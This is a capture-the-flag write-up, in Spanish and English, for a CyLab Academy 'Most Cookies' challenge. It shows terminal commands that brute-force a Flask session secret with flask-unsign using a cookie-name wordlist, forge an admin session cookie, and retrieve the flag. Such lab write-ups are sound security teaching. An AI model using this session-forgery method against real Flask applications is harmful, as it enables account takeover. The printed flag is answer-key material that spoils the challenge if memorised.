# DESCRIPCIÓN: 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://challenge-files.cylabacademy.net/library/ee23cf08573e2c81618150407cdc7db0afa7373693bc0a62c89bf5392d270296/server.py) 
How secure is a flask cookie?

# SOLUCIÓN:
#### academy{cO0ki3s_yum_8dce1e80}
```
┌──(mony㉿Mony)-[~]
└─$ mkdir -p ~/ctf-most-cookies && cd ~/ctf-most-cookies
┌──(mony㉿Mony)-[~/ctf-most-cookies]
└─$ python3 -m venv venv
┌──(mony㉿Mony)-[~/ctf-most-cookies]
└─$ source venv/bin/activate
┌──(venv)(mony㉿Mony)-[~/ctf-most-cookies]
└─$ cat <<EOF > cookies_wordlist.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
EOF
┌──(venv)(mony㉿Mony)-[~/ctf-most-cookies]
└─$ curl -I http://xebec.cylabacademy.net:47129/
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.1 Python/3.12.3
Date: Mon, 28 Sep 2026 07:38:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aroZaw.lIcq9d0Ijb3XzZRKSqdZFVzbcOY; HttpOnly; Path=/
Connection: close
┌──(venv)(mony㉿Mony)-[~/ctf-most-cookies]
└─$ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aroZaw.lIcq9d0Ijb3XzZRKSqdZFVzbcOY --wordlist cookies_wo
rdlist.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'icebox'
┌──(venv)(mony㉿Mony)-[~/ctf-most-cookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'icebox'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arocMQ.z6SXxjhgZYYfOr2na_mm1UJ8ALI

┌──(venv)(mony㉿Mony)-[~/ctf-most-cookies]
└─$ curl -s -L -b "session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arocMQ.z6SXxjhgZYYfOr2na_mm1UJ8ALI" http://xebec.cylabacademy.net:47129/
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>academy{cO0ki3s_yum_8dce1e80}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; CyLab Academy</p>
        </footer>

    </div>
</body>

</html>
```

# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/